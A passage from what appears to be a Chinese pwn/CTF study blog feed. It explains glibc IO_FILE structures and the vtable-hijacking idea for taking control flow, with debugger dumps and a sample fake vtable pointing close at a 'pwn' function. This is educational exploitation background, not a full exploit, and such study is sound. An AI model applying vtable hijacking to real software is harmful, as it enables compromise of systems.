域彼此连接形成一个链表，链表头部用全局变量 <code>_IO_list_all</code>  表示，通过这个值我们可以遍历所有的 FILE 结构。</p>\n<p><strong>每个文件流都有自己的 FILE 结构体</strong>。我们可以在  <code>libc.so</code>  中找到  <code>stdin\\stdout\\stderr</code>  等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>\n<blockquote>\n<p><code>_IO_2_1_stderr_</code> <br>\n <code>_IO_2_1_stdout_</code> <br>\n <code>_IO_2_1_stdin_</code></p>\n</blockquote>\n<p>但是 file 结构其实只是一小部分，还有一个叫 <code>vtable</code>  指针，同属于 <code>_IO_File_plus:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    _IO_FILE    file<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    IO_jump_t   <span class=\"token operator\">*</span>vtable<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//32 位下的偏移是 0x94，而 64 位下偏移是 0xd8</span></pre></td></tr></table></figure><blockquote>\n<p>gdb</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x7ffff7bc5620</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">11</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>file <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> _flags <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">72537977</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc56a4</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc48e0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdin_<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> _fileno <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> _old_offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token char\">'\\000'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc6780</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_1_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre> _offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre> _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc47a0</span> <span class=\"token operator\">&lt;</span>_IO_wide_data_1<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre> _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> _mode <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>vtable <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7bc36e0</span> <span class=\"token operator\">&lt;</span>_IO_file_jumps<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n<p>Vtable 存着一些跳转的函数指针</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> funcs<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token number\">1</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// \"extra word\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token number\">2</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// DUMMY</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token number\">3</span> exit<span class=\"token punctuation\">,</span> <span class=\"token comment\">// finish</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token number\">4</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// overflow</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token number\">5</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// underflow</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token number\">6</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// uflow</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token number\">7</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// pbackfail</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token number\">8</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// xsputn  #printf</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token number\">9</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// xsgetn</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token number\">10</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seekoff</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token number\">11</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seekpos</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token number\">12</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// setbuf</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token number\">13</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// sync</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token number\">14</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// doallocate</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token number\">15</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// read</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token number\">16</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// write</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token number\">17</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// seek</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token number\">18</span> pwn<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// close</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token number\">19</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// stat</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token number\">20</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// showmanyc</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token number\">21</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// imbue</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p _IO_file_jumps</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">12</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __dummy <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __dummy2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __finish <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff78799d0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_finish<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __overflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787a740</span> <span class=\"token operator\">&lt;</span>_IO_new_file_overflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __underflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787a4b0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_underflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __uflow <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787b610</span> <span class=\"token operator\">&lt;</span>__GI__IO_default_uflow<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __pbackfail <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787c990</span> <span class=\"token operator\">&lt;</span>__GI__IO_default_pbackfail<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __xsputn <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff78791f0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_xsputn<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __xsgetn <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878ed0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_xsgetn<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  __seekoff <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff78784d0</span> <span class=\"token operator\">&lt;</span>_IO_new_file_seekoff<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  __seekpos <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787ba10</span> <span class=\"token operator\">&lt;</span>_IO_default_seekpos<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __setbuf <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878440</span> <span class=\"token operator\">&lt;</span>_IO_new_file_setbuf<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  __sync <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878380</span> <span class=\"token operator\">&lt;</span>_IO_new_file_sync<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  __doallocate <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff786d190</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_doallocate<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  __read <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff78791b0</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_read<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  __write <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878b80</span> <span class=\"token operator\">&lt;</span>_IO_new_file_write<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __seek <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878980</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_seek<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __close <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878350</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_close<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __stat <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7878b70</span> <span class=\"token operator\">&lt;</span>__GI__IO_file_stat<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __showmanyc <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787cb00</span> <span class=\"token operator\">&lt;</span>_IO_default_showmanyc<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __imbue <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff787cb10</span> <span class=\"token operator\">&lt;</span>_IO_default_imbue<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_jump_t</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">,</span> __dummy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">,</span> __dummy2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_finish_t<span class=\"token punctuation\">,</span> __finish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_overflow_t<span class=\"token punctuation\">,</span> __overflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_underflow_t<span class=\"token punctuation\">,</span> __underflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_underflow_t<span class=\"token punctuation\">,</span> __uflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_pbackfail_t<span class=\"token punctuation\">,</span> __pbackfail<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token comment\">/* showmany */</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_xsputn_t<span class=\"token punctuation\">,</span> __xsputn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_xsgetn_t<span class=\"token punctuation\">,</span> __xsgetn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seekoff_t<span class=\"token punctuation\">,</span> __seekoff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seekpos_t<span class=\"token punctuation\">,</span> __seekpos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_setbuf_t<span class=\"token punctuation\">,</span> __setbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_sync_t<span class=\"token punctuation\">,</span> __sync<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_doallocate_t<span class=\"token punctuation\">,</span> __doallocate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_read_t<span class=\"token punctuation\">,</span> __read<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_write_t<span class=\"token punctuation\">,</span> __write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seek_t<span class=\"token punctuation\">,</span> __seek<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_close_t<span class=\"token punctuation\">,</span> __close<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_stat_t<span class=\"token punctuation\">,</span> __stat<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_showmanyc_t<span class=\"token punctuation\">,</span> __showmanyc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_imbue_t<span class=\"token punctuation\">,</span> __imbue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token number\">0</span></span></span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    get_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    set_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p>\n<p>因此伪造 vtable 劫持控制流程的思想就是针对_IO_File_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中部署函数指针来实现</p>\n<p>所以 vtable 劫持分为 2 种，一种是直接改写 vtable 的函数的指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针为我们控制的内存，然后在其中布置函数指针。</p>\n<h3 id=\"小结\"><a class=\"markdownIt-Anchor\" href=\"#小结\">#</a> 小结</h3>\n<ul>\n<li>\n<p><strong>stdin、stdout、stderr</strong> 文件流位于  <code>libc.so</code>  的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上</p>\n</li>\n<li>\n<p><strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>，开启新的文件流文件描述符从 3 开始递增</p>\n</li>\n<li>\n<p>每个文件流都单独的  <code>_IO_FILE</code>  、 <code>_IO_FILE_plus</code>  结构体， <code>_IO_jump_t   *vtable</code>  只有一个各个文件流公用</p>\n</li>\n<li>\n<p>指针  <code>vtable</code>  指向了一系列函数指针，各种 IO 操作均是通过  <code>vtable</code>  指向各个具体函数实现功能</p>\n</li>\n<li>\n<p>文件流通过  <code>_chain</code>  构成链表，<strong>链表头部用全局变量 _IO_list_all 表示</strong></p>\n</li>\n<li>\n<p>ida 中通过搜索文件流名可以找到  <code>_IO_FILE</code>  、 <code>_IO_FILE_plus</code>  ，根据偏移（结构体最后位置）找到  <code>vtable</code></p>\n<pre><code>（eg:IO_2_1_stderr)\n</code></pre>\n</li>\n</ul>\n<p>先暂时了解这么多…</p>\n<blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NreWVkYWk5MTAvd2lraS5tcnNreWUuY24vYmxvYi9tYXN0ZXIvZG9jcy9Qd24vSU9fRklMRS9Qd25fSU9fRklMRS5tZA==\">https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/IO_FILE/Pwn_IO_FILE.md</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ2OD90aW1lX18xMzExPW40JTJCeG5EMERnNzAlM0RHJTNERE96M0RzQTNFUG9ZZTdLRzhRJTJGUXpZUmVE\">https://xz.aliyun.com/t/6468?time__1311=n4%2BxnD0Dg70%3DG%3DDOz3DsA3EPoYe7KG8Q%2FQzYReD</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGF3a0pXL3AvMTM1NDY0MTYuaHRtbA==\">https://www.cnblogs.com/hawkJW/p/13546416.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjU2Nz90aW1lX18xMzExPW40JTJCeG5EMERnN0clM0RCaERCcW9vR2tEUmlHNWklM0RkWURCN29E\">https://xz.aliyun.com/t/6567?time__1311=n4%2BxnD0Dg7G%3DBhDBqooGkDRiG5i%3DdYDB7oD</span></p>\n</blockquote>\n",
            "tags": [
                "IO_FILE"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/13/house-of-einherjar/",
            "url": "https://yhuanhuan01.github.io/2024/07/13/house-of-einherjar/",
            "title": "house-of-einherjar",
            "date_published": "2024-07-13T15:38:31.000Z",
